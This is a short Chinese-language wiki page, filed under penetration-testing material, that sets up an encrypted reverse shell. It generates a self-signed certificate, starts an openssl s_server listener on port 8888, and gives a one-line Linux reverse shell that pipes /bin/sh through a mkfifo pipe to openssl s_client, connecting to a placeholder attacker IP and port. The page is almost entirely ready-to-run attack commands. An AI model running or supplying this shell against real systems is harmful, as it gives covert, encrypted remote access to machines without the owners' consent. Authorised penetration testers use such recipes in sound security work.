<languages  />

生成自簽名證書
--------------

    openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes

服務端監聽8888端口
------------------

    openssl s_server -quiet -key key.pem -cert cert.pem -port 8888

Linux下使用mkfifo進行反彈shell
------------------------------

    mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect Your ip:Your port> /tmp/s; rm /tmp/s

[Category:滲透測試資料](Category:滲透測試資料 "wikilink")